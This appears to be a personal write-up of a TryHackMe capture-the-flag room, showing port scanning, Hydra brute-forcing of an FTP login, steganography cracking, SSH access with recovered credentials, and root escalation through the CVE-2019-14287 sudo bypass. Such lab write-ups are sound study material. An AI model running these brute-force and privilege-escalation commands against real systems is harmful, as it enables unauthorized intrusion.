5 AUG 2021 

ip : 10.10.224.173

SCANNING
========
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

ENUMERATOIN
============

$ gobuster dir -u "http://10.10.224.173/" -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt | tee gobuster.txt

`doesn't sound so promising`

taking :

` Use your own codename as user-agent to access the site. 
  Agent R `

as a  hint i installed a user agent switcher and start fuzzing it with A , B , C 
and C returned a different page :

http://10.10.224.173/agent_C_attention.php


`````
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

`````


user name = chris , and had a weak password .


ssh bruteforcing with hydra cheatsheet :

https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux/

ssh seems not to work so i try ftp .

$ hydra -l chris   -P /usr/share/wordlists/rockyou.txt 10.10.224.173  ftp     


```
[21][ftp] host: 10.10.224.173   login: chris   password: crystal

```

logged in at ftp with chris and found  : "read access only"

```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png

```
ftp >mget * 


then let's check them

found out that cute-alien.jpg has a passphrase when i tried "steghide extract -sf cute-alien.jpg"
 
$ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt              
````
[i] Found passphrase: "Area51"           
[i] Original filename: "message.txt".
[i] Extracting to "cute-alien.jpg.out".
````


````
└─$ cat cute-alien.jpg.out                                                                                2 ⚙
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

````

Credits
========
james,hackerrules!


$ssh james@ip 

[*] now you can read user.txt flag 

````
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
````

so he can't execute any as a root 

![Alt Text](https://media.giphy.com/media/a5viI92PAF89q/giphy.gif)

google : (ALL, !root) /bin/bash

found :

CVE-2019-14287

````
oe Vennix from Apple Information Security found that the function fails to parse all values correctly 

and when giving the parameter user id “-1” or its unsigned number “4294967295”, the command will run as root, bypassing the security policy entry

````

sudo -u#4294967295 bash

##### rooted !


let's get back to THM tasks :
-------------------------------

asking for a zip file pass but i can't find any  :( . 

we have found 2 images in the ftp so let's get benift from the other png 

`$binwalk -e cutie.png`

found a zipped file indeed let's crack it :) 

$zip2john zipped.zip | tee hashed 

$john hashed --wordlists=/usr/share/wordlists/rockyou.txt


`alien            (zipfile.zip/To_agentR.txt)`


in /home/james there was an img and there is a task about what is this incident so i google by images and found it :
![image](https://user-images.githubusercontent.com/67979878/128450852-231c158f-ce25-4ebd-ac42-4c855f1af221.png)




